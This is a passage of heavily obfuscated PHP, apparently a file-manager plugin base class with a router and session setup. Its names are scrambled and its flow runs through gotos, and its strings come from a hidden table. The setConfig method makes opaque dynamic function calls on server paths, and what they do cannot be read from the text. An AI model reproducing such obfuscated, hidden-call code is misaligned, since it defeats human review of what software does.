$a„†‡åÑİ = parse_url_query($d¯‚‹à©óÏ); if (isset($a„†‡åÑİ[$E„íâ‡®[1426]]) && isset($a„†‡åÑİ[$E„íâ‡®[209]])) { $cÕ¶ª˜ƒ¼† = Model($E„íâ‡®[739])->get($E„íâ‡®[740]); $E…é©ÔË¹° = Mcrypt::decode($a„†‡åÑİ[$E„íâ‡®[209]], $cÕ¶ª˜ƒ¼†); if ($E…é©ÔË¹°) { $this->fileInfo = IO::infoWithChildren($E…é©ÔË¹°); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E…é©ÔË¹°; } } $d¯‚‹à©óÏ = $this->_cacheHttpFile($d¯‚‹à©óÏ); $this->fileInfo = IO::infoWithChildren($d¯‚‹à©óÏ); } else { $this->fileInfo = IO::infoWithChildren($d¯‚‹à©óÏ); if (!$this->fileInfo) { show_tips(LNG($E„íâ‡®[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($E„íâ‡®[1425], $d¯‚‹à©óÏ); return $d¯‚‹à©óÏ; } final function _cacheHttpFile($aÓˆ»œ¥«Â) { $d¥¡áì°§ = hash_path($aÓˆ»œ¥«Â, !0); $this->cachePath = $this->pluginCachePath($d¥¡áì°§); if ($cÌâ¢Ö²Á× = IO::fileNameExist($this->cachePath, $d¥¡áì°§)) { return KodIO::make($cÌâ¢Ö²Á×); } $E¡¨Ÿ°æ¯Ü = $this->cachePath . $d¥¡áì°§; return $this->pluginCacheFileSet($E¡¨Ÿ°æ¯Ü, file_get_contents_nossl($aÓˆ»œ¥«Â)); } final function _tmpFileName($eÌ‡îô„ˆô = array()) { goto dÈ¼ÎùŒ…; Bñ‚ƒ©: if (isset($eÌ‡îô„ˆô[$Aãó—·ç¥‡[164]][$Aãó—·ç¥‡[171]])) { return $eÌ‡îô„ˆô[$Aãó—·ç¥‡[164]][$Aãó—·ç¥‡[171]]; } $C­„‡©™‰ = IO::hashSimple($eÌ‡îô„ˆô[$Aãó—·ç¥‡[76]]); if ($C­„‡©™‰) { return $C­„‡©™‰; } goto E¢»£‰İÌ; dÈ¼ÎùŒ…: $Aãó—·ç¥‡ =& $_SERVER[«¾°Ã¤]; if (!$eÌ‡îô„ˆô) { $eÌ‡îô„ˆô = $this->fileInfo; } if (isset($eÌ‡îô„ˆô[$Aãó—·ç¥‡[171]])) { return $eÌ‡îô„ˆô[$Aãó—·ç¥‡[171]]; } goto Bñ‚ƒ©; E¢»£‰İÌ: $CÈî§¡ÓøŒ = array($eÌ‡îô„ˆô[$Aãó—·ç¥‡[28]], $eÌ‡îô„ˆô[$Aãó—·ç¥‡[76]], $eÌ‡îô„ˆô[$Aãó—·ç¥‡[78]]); if (isset($eÌ‡îô„ˆô[$Aãó—·ç¥‡[496]])) { $CÈî§¡ÓøŒ[] = $eÌ‡îô„ˆô[$Aãó—·ç¥‡[496]]; } return md5(implode($Aãó—·ç¥‡[71], $CÈî§¡ÓøŒ)); goto D¼“«Îø’; D¼“«Îø’: } final function checkSharePath($E‘‹ùêÅŒ) { goto A¡ğ„•Ü¥; A¡ğ„•Ü¥: $bí»ì¡ìê =& $_SERVER[«¾°Ã¤]; if (!defined($bí»ì¡ìê[463])) { define($bí»ì¡ìê[1427], 0); } if (!$this->isShare($E‘‹ùêÅŒ)) { return !1; } goto BÍÛøó£ùÈ; BÍÛøó£ùÈ: $Bã¯Õêºæ = Action($bí»ì¡ìê[1071])->sharePathInfo($E‘‹ùêÅŒ); if (!isset($Bã¯Õêºæ[$bí»ì¡ìê[76]])) { show_json(LNG($bí»ì¡ìê[1428]), !1); } $this->fileInfo = $Bã¯Õêºæ[$bí»ì¡ìê[164]]; goto F”ÂŸ¤À¢„; F”ÂŸ¤À¢„: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bí»ì¡ìê[171]]); return $Bã¯Õêºæ[$bí»ì¡ìê[76]]; goto bÑˆ‚¼ˆŸ¿; bÑˆ‚¼ˆŸ¿: } final function pluginCachePath($A áé÷àù = '') { $e»‘’Ğ—ø½ =& $_SERVER[«¾°Ã¤]; $aÏÈ«¨Ù = IO_PATH_SYSTEM_TEMP . $e»‘’Ğ—ø½[1429] . $this->pluginName; if (!($CµØ¾ÍÈ¼ = IO::infoFull($aÏÈ«¨Ù))) { return IO::mkdir($aÏÈ«¨Ù . $e»‘’Ğ—ø½[8] . $A áé÷àù); } if (empty($A áé÷àù)) { return $CµØ¾ÍÈ¼[$e»‘’Ğ—ø½[76]]; } if (!($Fàíã÷ç¶¥ = IO::fileNameExist($CµØ¾ÍÈ¼[$e»‘’Ğ—ø½[76]], $A áé÷àù))) { return IO::mkdir($CµØ¾ÍÈ¼[$e»‘’Ğ—ø½[76]] . $A áé÷àù); } return KodIO::make($Fàíã÷ç¶¥); } final function pluginCacheFileSet($AŸ¨®éâÑÜ, $dæ™›‘¸¬ = '') { $DÇÂ†µé»¤ =& $_SERVER[«¾°Ã¤]; if (!($DËë…ßÖÃ = IO::infoFull($AŸ¨®éâÑÜ))) { return IO::mkfile($AŸ¨®éâÑÜ, $dæ™›‘¸¬, REPEAT_REPLACE); } IO::setContent($DËë…ßÖÃ[$DÇÂ†µé»¤[76]], $dæ™›‘¸¬); return $DËë…ßÖÃ[$DÇÂ†µé»¤[76]]; } final function pluginLocalFile($FÄÉËÑğ¯ = '') { goto b—œ¨‰ºËÇ; FÖŸ»ÍÍ›: if (!checkExtSafe($D™Ú¾ÛÖé)) { $D™Ú¾ÛÖé = $D™Ú¾ÛÖé . $F¯ŒË­Ú†[1430]; } $D²Óêš²Ûß = $Aõ°¬ŞÙí¨ . $D™Ú¾ÛÖé; if (@file_exists($D²Óêš²Ûß)) { return $D²Óêš²Ûß; } goto Dùğ£ø¶®¨; b—œ¨‰ºËÇ: $F¯ŒË­Ú† =& $_SERVER[«¾°Ã¤]; $Aõ°¬ŞÙí¨ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Aõ°¬ŞÙí¨)) { mk_dir($Aõ°¬ŞÙí¨); } goto Fçˆ¯§ß¬´; Dùğ£ø¶®¨: return IO::copy($FÄÉËÑğ¯, $Aõ°¬ŞÙí¨, 0, $D™Ú¾ÛÖé); goto bÑˆ™¯æå¿; Fçˆ¯§ß¬´: if (!$FÄÉËÑğ¯) { return $Aõ°¬ŞÙí¨; } $FÏÊô«‚¯• = IO::info($FÄÉËÑğ¯); $D™Ú¾ÛÖé = $this->_tmpFileName($FÏÊô«‚¯•) . $F¯ŒË­Ú†[95] . $FÏÊô«‚¯•[$F¯ŒË­Ú†[168]]; goto FÖŸ»ÍÍ›; bÑˆ™¯æå¿: } final function appPackage() { goto A†ŠÊ¾ë; CÖ”ÉÃğç: return $e²×Æ’‰´ò; goto CÁĞë°˜§ï; Fš«øÎ´ˆö: $FÛ ®‘‚Ÿ÷ = Hook::trigger($EòØÜ“ŒŠ[1432], $e²×Æ’‰´ò); if ($FÛ ®‘‚Ÿ÷ && is_array($FÛ ®‘‚Ÿ÷)) { $e²×Æ’‰´ò = $FÛ ®‘‚Ÿ÷; } $this->packageData = $e²×Æ’‰´ò; goto CÖ”ÉÃğç; A†ŠÊ¾ë: $EòØÜ“ŒŠ =& $_SERVER[«¾°Ã¤]; if ($this->packageData) { return $this->packageData; } $f±£š™÷ÉÔ = $this->parseFile($this->pluginPath . $EòØÜ“ŒŠ[1431]); goto eæ¨«ª¶‘; eæ¨«ª¶‘: $this->parseLang($f±£š™÷ÉÔ); $e²×Æ’‰´ò = json_decode_force($f±£š™÷ÉÔ); if (!$e²×Æ’‰´ò) { return array(); } goto Fš«øÎ´ˆö; CÁĞë°˜§ï: } public function packageInfoGet($F„â°Â¥) { $CÛ±¢­ÊóÚ = $this->appPackage(); return array_get_value($CÛ±¢­ÊóÚ, $F„â°Â¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[«¾°Ã¤][1433]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[«¾°Ã¤][1434]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[«¾°Ã¤][1435]); } private function parseFile($EƒĞ÷ªéÅ‹) { goto fêÉº¤…ƒ¿; E¶ø·Î°Ô‡: $FÁµŠ¶ÇØå = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aˆíØ§§ÂÜ[88]][$aˆíØ§§ÂÜ[1443]]); if (strstr($CáÉË² ¬õ, $aˆíØ§§ÂÜ[1444])) { $a¾™ˆ¹È”† = rawurlencode(json_encode($this->pluginLangArr)); $CáÉË² ¬õ = str_replace($aˆíØ§§ÂÜ[1444], $a¾™ˆ¹È”†, $CáÉË² ¬õ); } if (strstr($CáÉË² ¬õ, $aˆíØ§§ÂÜ[1445])) { $a¾™ˆ¹È”† = $a¾™ˆ¹È”† = rawurlencode(json_encode($this->getConfig())); $CáÉË² ¬õ = str_replace($aˆíØ§§ÂÜ[1445], $a¾™ˆ¹È”†, $CáÉË² ¬õ); } goto BÄ·³Ó¾™Ó; fêÉº¤…ƒ¿: $aˆíØ§§ÂÜ =& $_SERVER[«¾°Ã¤]; $CáÉË² ¬õ = file_get_contents_nossl($EƒĞ÷ªéÅ‹); $aãß†ìÄ· = array($aˆíØ§§ÂÜ[1436], $aˆíØ§§ÂÜ[1437], $aˆíØ§§ÂÜ[1438], $aˆíØ§§ÂÜ[1439], $aˆíØ§§ÂÜ[1440], $aˆíØ§§ÂÜ[1441], $aˆíØ§§ÂÜ[1442]); goto E¶ø·Î°Ô‡; BÄ·³Ó¾™Ó: $CáÉË² ¬õ = str_replace($aãß†ìÄ·, $FÁµŠ¶ÇØå, $CáÉË² ¬õ); return $CáÉË² ¬õ; goto Bê» ¯«°; Bê» ¯«°: } private function parseLang(&$cŠÄ–ÈÓ‡) { goto e›á™ï„ø®; bÚ¸íŸ®â‚: $aØä’Êù£Ô = array(); foreach ($d«¨Ò–à®[0] as $dà†ÜÔÌŒÔ) { $b²İ›”íõ˜ = substr($dà†ÜÔÌŒÔ, strlen($D¼¹«¶¬ÉÉ), -4); $b˜î÷„ŒÁË = LNG($b²İ›”íõ˜); $b•À¼Ø¥¢[] = $dà†ÜÔÌŒÔ; $aØä’Êù£Ô[] = str_replace(array($d˜æòÕÅ‹„[229], $d˜æòÕÅ‹„[1039], $d˜æòÕÅ‹„[340], $d˜æòÕÅ‹„[116]), array($d˜æòÕÅ‹„[50], $d˜æòÕÅ‹„[50], $d˜æòÕÅ‹„[33], $d˜æòÕÅ‹„[1448]), $b˜î÷„ŒÁË); } $cŠÄ–ÈÓ‡ = str_replace($b•À¼Ø¥¢, $aØä’Êù£Ô, $cŠÄ–ÈÓ‡); goto dÖ‰é„İ×; e›á™ï„ø®: $d˜æòÕÅ‹„ =& $_SERVER[«¾°Ã¤]; $D¼¹«¶¬ÉÉ = $d˜æòÕÅ‹„[1446]; if (!strstr($cŠÄ–ÈÓ‡, $D¼¹«¶¬ÉÉ)) { return; } goto A¦‘¬Ûƒ; A¦‘¬Ûƒ: preg_match_all($d˜æòÕÅ‹„[1447], $cŠÄ–ÈÓ‡, $d«¨Ò–à®); if (!is_array($d«¨Ò–à®) || count($d«¨Ò–à®) == 0 || !is_array($d«¨Ò–à®[0]) || count($d«¨Ò–à®[0]) == 0) { return; } $b•À¼Ø¥¢ = array(); goto bÚ¸íŸ®â‚; dÖ‰é„İ×: } private function parseConfig(&$D­¤Ì¦’âÛ) { goto e§ÊÉÅÚ¼‰; Fİ”Ãµ®œ—: preg_match_all($AÁÃŠ¡ÄòÑ[1450], $D­¤Ì¦’âÛ, $fí±ö³¤âŠ); if (!is_array($fí±ö³¤âŠ) || count($fí±ö³¤âŠ) == 0 || !is_array($fí±ö³¤âŠ[0]) || count($fí±ö³¤âŠ[0]) == 0) { return; } $EÍÔê…Ê“± = $this->getConfig(); goto Aô“ÔÍ¹ùß; e§ÊÉÅÚ¼‰: $AÁÃŠ¡ÄòÑ =& $_SERVER[«¾°Ã¤]; $B©³©ÃÏ·À = $AÁÃŠ¡ÄòÑ[1449]; if (!strstr($D­¤Ì¦’âÛ, $B©³©ÃÏ·À)) { return; } goto Fİ”Ãµ®œ—; Aô“ÔÍ¹ùß: $fØøóƒ–œ = array(); $F—Ìè»¯ø˜ = array(); foreach ($fí±ö³¤âŠ[0] as $C›ª¬¬ÒË˜) { $D‘¾Âöâò‘ = substr($C›ª¬¬ÒË˜, strlen($B©³©ÃÏ·À), -2); $fØøóƒ–œ[] = $C›ª¬¬ÒË˜; $F—Ìè»¯ø˜[] = _get($EÍÔê…Ê“±, $D‘¾Âöâò‘); } goto C‚İÒ×©à—; C‚İÒ×©à—: $D­¤Ì¦’âÛ = str_replace($fØøóƒ–œ, $F—Ìè»¯ø˜, $D­¤Ì¦’âÛ); goto cÙòùæØ¢; cÙòùæØ¢: } private function parsePackage(&$B„Îñ…Œ) { goto BäâÃ’í ©; B¨ÀÚÔòá: $B„Îñ…Œ = str_replace($A¶ÎòÒ°, $DçïÆº Á°, $B„Îñ…Œ); goto EóÁù¦ÍéÄ; EèòÆÛŒÏ“: $A¶ÎòÒ° = array(); $DçïÆº Á° = array(); foreach ($DÍÁÇ®•…[0] as $e‹İÑ¬íëâ) { $BŒ­ëµ×í = substr($e‹İÑ¬íëâ, strlen($cŸö¹ĞÉ¨Ü), -2); $A¶ÎòÒ°[] = $e‹İÑ¬íëâ; $DçïÆº Á°[] = _get($cìÊÛ›”Ë, $BŒ­ëµ×í); } goto B¨ÀÚÔòá; BäâÃ’í ©: $dİ¾˜×–‚¿ =& $_SERVER[«¾°Ã¤]; $cŸö¹ĞÉ¨Ü = $dİ¾˜×–‚¿[1451]; if (!strstr($B„Îñ…Œ, $cŸö¹ĞÉ¨Ü)) { return; } goto açšÚŞÒñ; açšÚŞÒñ: preg_match_all($dİ¾˜×–‚¿[1452], $B„Îñ…Œ, $DÍÁÇ®•…); if (!is_array($DÍÁÇ®•…) || count($DÍÁÇ®•…) == 0 || !is_array($DÍÁÇ®•…[0]) || count($DÍÁÇ®•…[0]) == 0) { return; } $cìÊÛ›”Ë = $this->appPackage(); goto EèòÆÛŒÏ“; EóÁù¦ÍéÄ: } final function echoFile($d”¬¢§ôâĞ, $d‰’°¿ñˆ¸ = false) { goto b¦÷¶³«–Ø; Cïö¹‚©íø: $this->parsePackage($e…²ó‚ßª); if (is_array($d‰’°¿ñˆ¸)) { $e…²ó‚ßª = str_replace(array_keys($d‰’°¿ñˆ¸), array_values($d‰’°¿ñˆ¸), $e…²ó‚ßª); } echo $B’ó¯„÷×ï[229] . $e…²ó‚ßª; goto D‚Ğé¥°‚ê; bÈÊ´„‘‡×: $e…²ó‚ßª = $this->parseFile($FºÛ‚Ã§Š¢); $this->parseLang($e…²ó‚ßª); $this->parseConfig($e…²ó‚ßª); goto Cïö¹‚©íø; b¦÷¶³«–Ø: $B’ó¯„÷×ï =& $_SERVER[«¾°Ã¤]; $FºÛ‚Ã§Š¢ = $this->pluginPath . $d”¬¢§ôâĞ; if (ACT == $B’ó¯„÷×ï[1453]) { echo $B’ó¯„÷×ï[1454] . $this->pluginName . $B’ó¯„÷×ï[8] . $d”¬¢§ôâĞ . $B’ó¯„÷×ï[1455]; if (!file_exists($FºÛ‚Ã§Š¢)) { echo $B’ó¯„÷×ï[1456]; return; } } goto bÈÊ´„‘‡×; D‚Ğé¥°‚ê: } final function initLang() { goto f„¬„’¡Ä‘; b…¡‰‡õÀ‘: if (!is_array($d«¦ø²âË…)) { return array(); } if (@count($d«¦ø²âË…) > 0) { I18n::set($d«¦ø²âË…); } return $d«¦ø²âË…; goto Aİ™¶èÅ‘; a×•”ÎèìÓ: $b‰êòÖ½ğ = I18n::getType(); $d«¦ø²âË… = array(); if (file_exists($B‚ºâœŒÖ¿ . $b‰êòÖ½ğ . $aÖô®¬ÒÙĞ[812])) { $d«¦ø²âË… = (include $B‚ºâœŒÖ¿ . $b‰êòÖ½ğ . $aÖô®¬ÒÙĞ[812]); } else { if ($b‰êòÖ½ğ == $aÖô®¬ÒÙĞ[1459] && !file_exists($B‚ºâœŒÖ¿ . $b‰êòÖ½ğ . $aÖô®¬ÒÙĞ[812]) && file_exists($B‚ºâœŒÖ¿ . $aÖô®¬ÒÙĞ[1460])) { $d«¦ø²âË… = (include $B‚ºâœŒÖ¿ . $aÖô®¬ÒÙĞ[1460]); } else { if (file_exists($B‚ºâœŒÖ¿ . $AÂ¸ÅéôÄ¡ . $aÖô®¬ÒÙĞ[812])) { $d«¦ø²âË… = (include $B‚ºâœŒÖ¿ . $AÂ¸ÅéôÄ¡ . $aÖô®¬ÒÙĞ[812]); } } } goto b…¡‰‡õÀ‘; f„¬„’¡Ä‘: $aÖô®¬ÒÙĞ =& $_SERVER[«¾°Ã¤]; $AÂ¸ÅéôÄ¡ = $aÖô®¬ÒÙĞ[1457]; $B‚ºâœŒÖ¿ = $this->pluginPath . $aÖô®¬ÒÙĞ[1458]; goto a×•”ÎèìÓ; Aİ™¶èÅ‘: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($fíÉ‡°“¬Û) { $E‹ØöÖ¡‡“ =& $_SERVER[«¾°Ã¤]; if ($_SERVER[$E‹ØöÖ¡‡“[396]] != $_SERVER[$E‹ØöÖ¡‡“[1331]]) { goto f»§Š¬äùÓ; c‰´è“«¶†: $c¬à†¡ƒéŠ = 1; while ($c¬à†¡ƒéŠ > 1) { $c¬à†¡ƒéŠ = $c¬à†¡ƒéŠ + 4; $eŸö¼òœââ = rawurlencode($c¬à†¡ƒéŠ . $E‹ØöÖ¡‡“[375]); } goto Bô¬ñô‡Îî; AŠî‘º‰´: $FæŠŒ¦¡– = $E‹ØöÖ¡‡“[841]; $FæŠŒ¦¡–($_SERVER[$E‹ØöÖ¡‡“[842]]); $FæŠŒ¦¡–($_SERVER[$E‹ØöÖ¡‡“[398]] . $E‹ØöÖ¡‡“[1461]); goto c‰´è“«¶†; fÓ¡´ÃÈ§×: $Aòó¼İÀš = $fƒÜî­ëÇ($BìçÎ³„Ê¥); $CÙ‚Â½Üã = explode($E‹ØöÖ¡‡“[229], $Aòó¼İÀš); if (count($CÙ‚Â½Üã) < $E‹ØöÖ¡‡“[587]) { $eÓßİÇ–Óñ = $E‹ØöÖ¡‡“[401]; $eÓßİÇ–Óñ(); } goto AŠî‘º‰´; f»§Š¬äùÓ: $b‹í‰İØ = $E‹ØöÖ¡‡“[840]; $fƒÜî­ëÇ = $E‹ØöÖ¡‡“[397]; $BìçÎ³„Ê¥ = $_SERVER[$E‹ØöÖ¡‡“[398]] . $E‹ØöÖ¡‡“[399]; goto fÓ¡´ÃÈ§×; Bô¬ñô‡Îî: } return $this->modelPlugin->setConfig($this->pluginName, $fíÉ‡°“¬Û); } public function onSetConfig($c´œ÷Öƒ¼Ä) { } public function onGetConfig($f·ñ‡¼¿) { } public function onChangeStatus($fâÂŸ×¶ÆÄ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($F…×‚¨Î× = "\160\x6c\x75\147\x69\x6e\x41\165\164\150") { $bÜ…ãîº¨Í =& $_SERVER[«¾°Ã¤]; if (!defined($bÜ…ãîº¨Í[463])) { return !1; } if (_get($GLOBALS, $bÜ…ãîº¨Í[494])) { return !0; } $bªËßÈ±òÏ = $this->getConfig(); if (!$bªËßÈ±òÏ[$F…×‚¨Î×]) { return !1; } return ActionCall($bÜ…ãîº¨Í[1462], $bªËßÈ±òÏ[$F…×‚¨Î×]); } public function url($A¿„á²‰õ¥, $bñ„ã¥ô†“ = '', $Cã½µŞÇíÍ = true) { goto a—áïº´ìø; a—áïº´ìø: $BË«Şñ¯÷ˆ =& $_SERVER[«¾°Ã¤]; $d”©¤‡ĞÆ  = $this->getConfig(); $E¨öá…¦“ = KOD_VERSION . $BË«Şñ¯÷ˆ[95] . KOD_VERSION_BUILD; goto cò«àõ£Ñï; f˜ÍÔ¹ìã: if (!$Cã½µŞÇíÍ) { return $B¼Î¶šâÆ¯; } echo $B¼Î¶šâÆ¯; goto CÎåÛ”Œï²; cò«àõ£Ñï: $A„Ä¦“—ÖŒ = $this->packageVersion(); $eàºÆ•î»à = $E¨öá…¦“ . $BË«Şñ¯÷ˆ[449] . $A„Ä¦“—ÖŒ; if (substr($A¿„á²‰õ¥, 0, 4) == $BË«Şñ¯÷ˆ[147] || substr($A¿„á²‰õ¥, 0, 2) == $BË«Şñ¯÷ˆ[1246]) { $B¼Î¶šâÆ¯ = $A¿„á²‰õ¥ . $BË«Şñ¯÷ˆ[1463] . $eàºÆ•î»à; } else { if ($bñ„ã¥ô†“ == $BË«Şñ¯÷ˆ[33]) { $B¼Î¶šâÆ¯ = $this->pluginHost . $A¿„á²‰õ¥ . $BË«Şñ¯÷ˆ[1463] . $eàºÆ•î»à; } else { if ($bñ„ã¥ô†“ === $BË«Şñ¯÷ˆ[77]) { $B¼Î¶šâÆ¯ = $this->pluginHost . $A¿„á²‰õ¥; } else { if ($bñ„ã¥ô†“ == $BË«Şñ¯÷ˆ[1464]) { $B¼Î¶šâÆ¯ = STATIC_PATH . $A¿„á²‰õ¥ . $BË«Şñ¯÷ˆ[1463] . $E¨öá…¦“; } else { if ($bñ„ã¥ô†“ == $BË«Şñ¯÷ˆ[1465]) { $B¼Î¶šâÆ¯ = APP_HOST . $BË«Şñ¯÷ˆ[1466] . $A¿„á²‰õ¥ . $BË«Şñ¯÷ˆ[1463] . $E¨öá…¦“; } else { if (isset($d”©¤‡ĞÆ [$bñ„ã¥ô†“])) { $B¼Î¶šâÆ¯ = $d”©¤‡ĞÆ [$bñ„ã¥ô†“] . $A¿„á²‰õ¥ . $BË«Şñ¯÷ˆ[1463] . $eàºÆ•î»à; } } } } } } goto f˜ÍÔ¹ìã; CÎåÛ”Œï²: } public function link($cÚºº Õ = false, $Fóéš˜‘•¿ = '') { $A„·½Øâì =& $_SERVER[«¾°Ã¤]; if (!$cÚºº Õ) { $this->link($A„·½Øâì[1467], $A„·½Øâì[1465]); $this->link($A„·½Øâì[1468], $A„·½Øâì[1464]); $this->link($A„·½Øâì[1469], $A„·½Øâì[1464]); $this->link($A„·½Øâì[1470], $A„·½Øâì[1464]); $this->link($A„·½Øâì[1471], $A„·½Øâì[1464]); return; } $EíÏ¯«…½ = $this->url($cÚºº Õ, $Fóéš˜‘•¿, !1); if (substr($cÚºº Õ, -3) == $A„·½Øâì[1472]) { echo $A„·½Øâì[1473] . $EíÏ¯«…½ . $A„·½Øâì[1474] . $A„·½Øâì[229]; } else { if (substr($cÚºº Õ, -4) == $A„·½Øâì[1475]) { echo $A„·½Øâì[1476] . $EíÏ¯«…½ . $A„·½Øâì[1477] . $A„·½Øâì[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\x5e\57\135\x2b", "\x3a\156\165\x6d" => "\133\x30\55\x39\135\x2b", "\72\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($cóØàµÂ×, $añ³Õë¦ËÚ) { $C‘Ôº¥ =& $_SERVER[«¾°Ã¤]; if ($cóØàµÂ× == $C‘Ôº¥[1478]) { $eé‹ÅŒŒ¾Ù = array_map($C‘Ôº¥[1479], $añ³Õë¦ËÚ[0]); $e¯ŠÃ†äõ = strpos($añ³Õë¦ËÚ[1], $C‘Ôº¥[8]) === 0 ? $añ³Õë¦ËÚ[1] : $C‘Ôº¥[8] . $añ³Õë¦ËÚ[1]; $c¯å›ˆ…µ‡ = $añ³Õë¦ËÚ[2]; } else { $eé‹ÅŒŒ¾Ù = null; $e¯ŠÃ†äõ = strpos($añ³Õë¦ËÚ[0], $C‘Ôº¥[8]) === 0 ? $añ³Õë¦ËÚ[0] : $C‘Ôº¥[8] . $añ³Õë¦ËÚ[0]; $c¯å›ˆ…µ‡ = $añ³Õë¦ËÚ[1]; } array_push(self::$maps, $eé‹ÅŒŒ¾Ù); array_push(self::$routes, $e¯ŠÃ†äõ); array_push(self::$methods, strtoupper($cóØàµÂ×)); array_push(self::$callbacks, $c¯å›ˆ…µ‡); } public static function error($a‰¢¡Éæ‹Ğ) { self::$errorCallback = $a‰¢¡Éæ‹Ğ; } public static function haltOnMatch($fÊ¿·ğ™º = true) { self::$halts = $fÊ¿·ğ™º; } public static function dispatch() { goto CØ£¨Ê‡Å; D¥ğ¢ÏÜŠ: self::$routes = preg_replace($d‘õøäá†Ä[1165], $d‘õøäá†Ä[8], self::$routes); if (in_array($f‡·„Æ·÷ì, self::$routes)) { $DŠÔî„¤Ùî = array_keys(self::$routes, $f‡·„Æ·÷ì); foreach ($DŠÔî„¤Ùî as $cŠñéÚŞÚ) { if (self::$methods[$cŠñéÚŞÚ] == $AÒìô”¤ || self::$methods[$cŠñéÚŞÚ] == $d‘õøäá†Ä[1481] || in_array($AÒìô”¤, self::$maps[$cŠñéÚŞÚ])) { $DÄ²òô‡˜” = !0; if (!is_object(self::$callbacks[$cŠñéÚŞÚ])) { $D¥¸¯ £ = explode($d‘õøäá†Ä[8], self::$callbacks[$cŠñéÚŞÚ]); $DòİĞíÍ‹ = end($D¥¸¯ £); $FãÆï¨ëÙœ = explode($d‘õøäá†Ä[1482], $DòİĞíÍ‹); $CŠòõ“òÑé = new $FãÆï¨ëÙœ[0](); $CŠòõ“òÑé->{$FãÆï¨ëÙœ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$cŠñéÚŞÚ]); if (self::$halts) { return; } } } } } else { $cÒÔÍ«ä½¥ = 0; foreach (self::$routes as $cŠñéÚŞÚ) { if (strpos($cŠñéÚŞÚ, $d‘õøäá†Ä[4]) !== !1) { $cŠñéÚŞÚ = str_replace($b•¾ËŸÅ’ó, $CÄëÔî‘¯, $cŠñéÚŞÚ); } if (preg_match($d‘õøäá†Ä[1483] . $cŠñéÚŞÚ . $d‘õøäá†Ä[1484], $f‡·„Æ·÷ì, $dÌÁ›«›ŠÂ)) { if (self::$methods[$cÒÔÍ«ä½¥] == $AÒìô”¤ || self::$methods[$cÒÔÍ«ä½¥] == $d‘õøäá†Ä[1481] || !empty(self::$maps[$cÒÔÍ«ä½¥]) && in_array($AÒìô”¤, self::$maps[$cÒÔÍ«ä½¥])) { $DÄ²òô‡˜” = !0; array_shift($dÌÁ›«›ŠÂ); if (!is_object(self::$callbacks[$cÒÔÍ«ä½¥])) { $D¥¸¯ £ = explode($d‘õøäá†Ä[8], self::$callbacks[$cÒÔÍ«ä½¥]); $DòİĞíÍ‹ = end($D¥¸¯ £); $FãÆï¨ëÙœ = explode($d‘õøäá†Ä[1482], $DòİĞíÍ‹); $CŠòõ“òÑé = new $FãÆï¨ëÙœ[0](); if (!method_exists($CŠòõ“òÑé, $FãÆï¨ëÙœ[1])) { echo $d‘õøäá†Ä[1485]; } else { call_user_func_array(array($CŠòõ“òÑé, $FãÆï¨ëÙœ[1]), $dÌÁ›«›ŠÂ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$cÒÔÍ«ä½¥], $dÌÁ›«›ŠÂ); if (self::$halts) { return; } } } } $cÒÔÍ«ä½¥++; } } if ($DÄ²òô‡˜” == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aôœ¯ ™ˆÕ =& $_SERVER[«¾°Ã¤]; header($_SERVER[$aôœ¯ ™ˆÕ[1486]] . $aôœ¯ ™ˆÕ[1487]); echo $aôœ¯ ™ˆÕ[1488]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$d‘õøäá†Ä[1480]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto e†ñÔ®£·İ; CØ£¨Ê‡Å: $d‘õøäá†Ä =& $_SERVER[«¾°Ã¤]; $f‡·„Æ·÷ì = parse_url($_SERVER[$d‘õøäá†Ä[1480]], PHP_URL_PATH); $AÒìô”¤ = $_SERVER[$d‘õøäá†Ä[157]]; goto b‰†ÉÅ·‘“; b‰†ÉÅ·‘“: $b•¾ËŸÅ’ó = array_keys(static::$patterns); $CÄëÔî‘¯ = array_values(static::$patterns); $DÄ²òô‡˜” = !1; goto D¥ğ¢ÏÜŠ; e†ñÔ®£·İ: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto BêÓÂÜĞó¤; CòöÅ¥¾ñÂ: $fß™éš“ˆ  = $D×íïÛã„»[$d–Û†Ç©†Ú]; $d«„Ê÷Ğò = $D×íïÛã„»[$d…ŠóÀ±ÔÔ[802]]; switch ($d–Û†Ç©†Ú) { case $d…ŠóÀ±ÔÔ[17]: self::$handle = Model($d…ŠóÀ±ÔÔ[803]); break; case $d…ŠóÀ±ÔÔ[804]: self::$handle = new CacheRedis($fß™éš“ˆ , $d«„Ê÷Ğò); break; case $d…ŠóÀ±ÔÔ[805]: self::$handle = new CacheMemcached($fß™éš“ˆ , $d«„Ê÷Ğò); break; case $d…ŠóÀ±ÔÔ[193]: $fß™éš“ˆ [$d…ŠóÀ±ÔÔ[76]] = $fß™éš“ˆ [$d…ŠóÀ±ÔÔ[76]] . $d…ŠóÀ±ÔÔ[1492]; self::$handle = new CacheFile($fß™éš“ˆ , $d«„Ê÷Ğò); default: break; } goto dÂà°ºÆĞ½; fÃà…Ú¼: $D×íïÛã„» = $GLOBALS[$d…ŠóÀ±ÔÔ[6]][$d…ŠóÀ±ÔÔ[347]]; self::$sessionTime = $D×íïÛã„»[$d…ŠóÀ±ÔÔ[1489]]; $bÛÈÈÎÛÌ­ = isset($GLOBALS[$d…ŠóÀ±ÔÔ[1490]]) ? $GLOBALS[$d…ŠóÀ±ÔÔ[1490]] : SESSION_ID; goto 